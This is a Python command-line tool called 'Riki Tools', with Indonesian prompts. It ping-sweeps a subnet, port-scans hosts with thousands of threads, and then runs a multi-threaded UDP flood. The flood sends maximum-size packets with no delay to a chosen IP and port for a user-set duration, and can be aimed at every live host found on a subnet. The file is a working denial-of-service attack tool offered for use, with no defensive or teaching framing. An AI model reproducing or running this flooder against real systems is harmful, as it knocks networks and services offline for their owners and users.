#!/usr/bin/python3

import subprocess
import sys
import os

# ========== AUTO INSTALL LIBRARY ==========
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_libraries = ["pyfiglet", "tqdm", "termcolor", "ipaddress"]
for library in required_libraries:
    try:
        __import__(library)
    except ImportError:
        install(library)

import socket
import pyfiglet
from tqdm import tqdm
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import signal
import ipaddress

# ========== FLASH: SCAN IP AKTIF DI SUBNET ==========
def ping(ip):
    plat = sys.platform
    if plat.startswith("win"):
        cmd = f"ping -n 1 -w 100 {ip} > NUL 2>&1"
    else:
        cmd = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1"
    response = os.system(cmd)
    return ip if response == 0 else None

def scan_alive_hosts(subnet):
    net = ipaddress.ip_network(subnet, strict=False)
    ip_list = [str(ip) for ip in net.hosts()]
    alive_ips = []
    print(colored(f"\nScanning aktif hosts di {subnet}...", "cyan"))

    done_flag = {"done": False}
    def anim():
        anim_chars = "|/-\\"
        idx = 0
        while not done_flag["done"]:
            print(anim_chars[idx % len(anim_chars)], end="\r")
            idx += 1
            time.sleep(0.1)

    t_anim = threading.Thread(target=anim)
    t_anim.daemon = True
    t_anim.start()

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = executor.map(ping, ip_list)
        for result in futures:
            if result:
                alive_ips.append(result)

    done_flag["done"] = True
    t_anim.join()
    print("Hosts aktif:")
    for ip in alive_ips:
        print(" -", ip)
    return alive_ips

# ========== PORT SCANNER (TCP) ==========
def portScanner(args):
    ip, port, timeout = args
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            result = s.connect_ex((ip, port))
            if result == 0:
                return port
        except:
            pass
    return None

def spinner_running_flag(flag):
    animation = "|/-\\"
    idx = 0
    while flag["running"]:
        sys.stdout.write(f"\r{animation[idx % len(animation)]} Scanning ports...")
        sys.stdout.flush()
        time.sleep(0.1)
        idx += 1
    sys.stdout.write("\r")

def scan_ports(target_ip, port_min=2, port_max=65000, timeout=0.5):
    logo_text = pyfiglet.figlet_format("Port Scanner")
    print(logo_text)
    print(colored(f"Scanning {target_ip} ports {port_min}-{port_max}...", "yellow"))
    open_ports = []
    tasks = [(target_ip, port, timeout) for port in range(port_min, port_max+1)]

    max_workers = os.cpu_count() * 2000
    print(colored(f"Using {max_workers} threads for fast scanning!", "cyan"))
    pbar = tqdm(total=len(tasks), ncols=70, unit="port", leave=False)

    spinner_flag = {"running": True}
    spinner_thread = threading.Thread(target=spinner_running_flag, args=(spinner_flag,))
    spinner_thread.daemon = True
    spinner_thread.start()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_port = {executor.submit(portScanner, task): task[1] for task in tasks}
        for future in as_completed(future_to_port):
            pbar.update(1)
            port = future_to_port[future]
            try:
                result = future.result()
                if result:
                    print(colored(f"\nPort {result} is OPEN", "green"))
                    open_ports.append(result)
            except Exception:
                pass

    spinner_flag["running"] = False
    spinner_thread.join()
    pbar.close()
    sys.stdout.write("\r")
    return open_ports

# ========== UDP TX + RX (NO DELAY) ==========
def udp_worker(target_ip, target_port, stop_signal, data_counter):
    packet = b"A" * 65507
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # non-blocking untuk RX
    sock.setblocking(False)
    try:
        while not stop_signal["stop"]:
            # TX
            sock.sendto(packet, (target_ip, target_port))
            data_counter["sent"] += len(packet)

            # RX (jika target echo balas)
            try:
                data, addr = sock.recvfrom(65536)
                data_counter["recv"] += len(data)
            except (BlockingIOError, OSError):
                # Tidak ada data masuk sekarang, lanjut flood
                pass
    except Exception as e:
        print(f"\nUDP Error: {str(e)}")
    finally:
        sock.close()

def run_traffic(target_ip, target_port, num_threads, total_seconds, stop_signal, data_counter):
    animation = "|/-\\"
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=udp_worker, args=(target_ip, target_port, stop_signal, data_counter))
        t.daemon = True
        t.start()
        threads.append(t)

    i = 0
    start_time = time.time()
    try:
        while not stop_signal["stop"]:
            elapsed = time.time() - start_time
            if total_seconds > 0 and elapsed >= total_seconds:
                stop_signal["stop"] = True
                break
            tx_mb = data_counter["sent"] / (1024 * 1024)
            rx_mb = data_counter["recv"] / (1024 * 1024)
            sys.stdout.write(
                f"\r{animation[i % len(animation)]} TX: {tx_mb:.2f} MB | RX: {rx_mb:.2f} MB | Time: {int(elapsed)//60}m {int(elapsed)%60}s"
            )
            sys.stdout.flush()
            i += 1
            # tidak ada sleep → full speed
    except KeyboardInterrupt:
        stop_signal["stop"] = True

    for t in threads:
        t.join()

    elapsed_time = time.time() - start_time
    tx_mb = data_counter["sent"] / (1024 * 1024)
    rx_mb = data_counter["recv"] / (1024 * 1024)
    print(f"\nTX: {data_counter['sent']} bytes ({tx_mb:.2f} MB)")
    print(f"RX: {data_counter['recv']} bytes ({rx_mb:.2f} MB)")
    print(f"Time elapsed: {elapsed_time:.2f} seconds")
    print(f"TX Rate: {tx_mb / elapsed_time:.2f} MB/s")
    print(f"RX Rate: {rx_mb / elapsed_time:.2f} MB/s")
    print(f"TX Rate: {8 * tx_mb / elapsed_time:.2f} Mbps")
    print(f"RX Rate: {8 * rx_mb / elapsed_time:.2f} Mbps")

# ========== MAIN + MENU ==========
def get_int_input(prompt, default):
    try:
        val = int(input(f"{prompt} (default {default}): ") or default)
        return val
    except ValueError:
        print("Input tidak valid, gunakan default.")
        return default

def menu():
    print("\n========== PILIH AKSI ==========")
    print("1. Scan Port saja")
    print("2. Scan Port lalu Kirim UDP (TX+RX, support flash/IP aktif)")
    print("3. Langsung Kirim UDP (TX+RX) tanpa scan port")
    print("0. Keluar")
    while True:
        pilih = input("Masukkan pilihan (1/2/3/0): ")
        if pilih in ["1", "2", "3", "0"]:
            return pilih
        else:
            print("Input tidak valid, masukkan 1, 2, 3, atau 0.")

def main():
    print(pyfiglet.figlet_format("Riki Tools"))
    aksi = menu()
    if aksi == "0":
        print("Keluar.")
        return

    # Tentukan target IP list
    if aksi == "2":
        ip_input = input("Masukkan IP target (atau 'flash' untuk subnet scan): ").strip()
        if ip_input.lower() == "flash":
            subnet = input("Masukkan subnet, contoh 192.168.0.0/24: ").strip()
            targets = scan_alive_hosts(subnet)
            if not targets:
                print("Tidak ada IP aktif.")
                return
        else:
            targets = [ip_input]
    else:  # aksi 1 atau 3
        ip_input = input("Masukkan IP target (default 127.0.0.1): ").strip()
        if ip_input == "":
            ip_input = "127.0.0.1"
        targets = [ip_input]

    # --- Aksi 1: Scan port saja ---
    if aksi == "1":
        open_ports = scan_ports(targets[0], 2, 65000)
        if not open_ports:
            print(colored("Tidak ada port terbuka ditemukan. Keluar.", "red"))
        else:
            print(colored("\nPORT TERBUKA:", "yellow"))
            for idx, port in enumerate(open_ports):
                print(f"{idx+1}. {port}")
        print("\nSelesai.\n")
        return

    # --- Aksi 2: Scan port + UDP TX/RX (bisa banyak IP aktif kalau flash) ---
    if aksi == "2":
        for ip_target in targets:
            print(colored(f"\n--- TARGET: {ip_target} ---", "blue"))
            open_ports = scan_ports(ip_target, 2, 65000)
            if not open_ports:
                print(colored(f"Tidak ada port terbuka di {ip_target}.", "red"))
                continue

            print(colored("\nPORT TERBUKA:", "yellow"))
            for idx, port in enumerate(open_ports):
                print(f"{idx+1}. {port}")

            while True:
                pilih = input(f"Pilih port yang akan digunakan untuk traffic UDP ke {ip_target} (input nomor): ")
                try:
                    pilih_idx = int(pilih) - 1
                    if 0 <= pilih_idx < len(open_ports):
                        target_port = open_ports[pilih_idx]
                        break
                    else:
                        print("Nomor salah.")
                except:
                    print("Input tidak valid.")

            num_threads = get_int_input("Masukkan jumlah thread", os.cpu_count() * 2)
            durasi_jam = get_int_input("Berapa JAM script dijalankan", 0)
            durasi_menit = get_int_input("Berapa MENIT script dijalankan", 1)
            total_seconds = durasi_jam * 3600 + durasi_menit * 60

            stop_signal = {"stop": False}
            data_counter = {"sent": 0, "recv": 0}

            def signal_handler(sig, frame):
                stop_signal["stop"] = True
                print("\nSIGINT received, stopping...")

            signal.signal(signal.SIGINT, signal_handler)

            print(colored(f"\nMulai kirim traffic UDP (TX+RX) ke {ip_target}:{target_port} (NO DELAY)\n", "cyan"))
            run_traffic(ip_target, target_port, num_threads, total_seconds, stop_signal, data_counter)

        return

    # --- Aksi 3: Langsung UDP TX/RX ke satu IP + port manual ---
    if aksi == "3":
        while True:
            p = input("Masukkan port UDP target: ")
            try:
                target_port = int(p)
                if 1 <= target_port <= 65535:
                    break
                else:
                    print("Port harus 1-65535.")
            except:
                print("Input tidak valid.")

        num_threads = get_int_input("Masukkan jumlah thread", os.cpu_count() * 2)
        durasi_jam = get_int_input("Berapa JAM script dijalankan", 0)
        durasi_menit = get_int_input("Berapa MENIT script dijalankan", 1)
        total_seconds = durasi_jam * 3600 + durasi_menit * 60

        stop_signal = {"stop": False}
        data_counter = {"sent": 0, "recv": 0}

        def signal_handler(sig, frame):
            stop_signal["stop"] = True
            print("\nSIGINT received, stopping...")

        signal.signal(signal.SIGINT, signal_handler)

        target_ip = targets[0]
        print(colored(f"\nMulai kirim traffic UDP (TX+RX) ke {target_ip}:{target_port} (NO DELAY)\n", "cyan"))
        run_traffic(target_ip, target_port, num_threads, total_seconds, stop_signal, data_counter)

if __name__ == "__main__":
    main()
